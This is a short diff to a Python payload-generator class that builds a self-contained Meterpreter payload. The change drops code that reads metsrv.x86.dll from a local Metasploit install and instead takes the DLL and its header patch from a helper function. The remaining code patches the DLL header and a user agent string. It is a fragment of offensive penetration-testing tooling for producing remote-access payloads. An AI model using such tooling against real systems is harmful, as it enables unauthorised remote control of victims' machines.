@@ -56,23 +56,11 @@ class Payload:
                     
     def generate(self):
         
-        if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"):
-            metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"
-        else:
-            print "[*] Error: You either do not have the latest version of Metasploit or"
-            print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
-            print "[*] Error: Please fix either issue then select this payload again!"
-            sys.exit()
-            
-        f = open(metsrvPath, 'rb')
-        meterpreterDll = f.read()
-        f.close()
-        
         # lambda function used for patching the metsvc.dll
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
         # patch the metsrv.dll header
-        headerPatch = helpers.selfcontained_patch()
+        meterpreterDll, headerPatch = helpers.selfcontained_patch()
         meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
 
         # patch in the default user agent string
